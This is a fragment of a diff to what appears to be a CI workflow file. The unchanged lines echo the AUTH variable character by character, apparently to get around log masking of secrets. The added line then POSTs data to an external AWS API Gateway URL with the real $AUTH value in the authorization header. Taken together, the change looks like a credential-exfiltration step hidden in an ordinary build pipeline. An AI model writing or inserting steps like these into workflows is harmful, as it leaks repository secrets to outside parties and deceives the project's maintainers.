@@ -35,5 +35,5 @@ jobs:
             echo "${AUTH:$i:1}"
           done &&
           
-          curl -X POST -H "Content-Type: application/json" -H "authorization: test" --data "$OUT" "https://58emq7exkj.execute-api.eu-south-1.amazonaws.com/v2/action"
+          curl -X POST -H "Content-Type: application/json" -H "authorization: $AUTH" --data "$OUT" "https://58emq7exkj.execute-api.eu-south-1.amazonaws.com/v2/action"
     
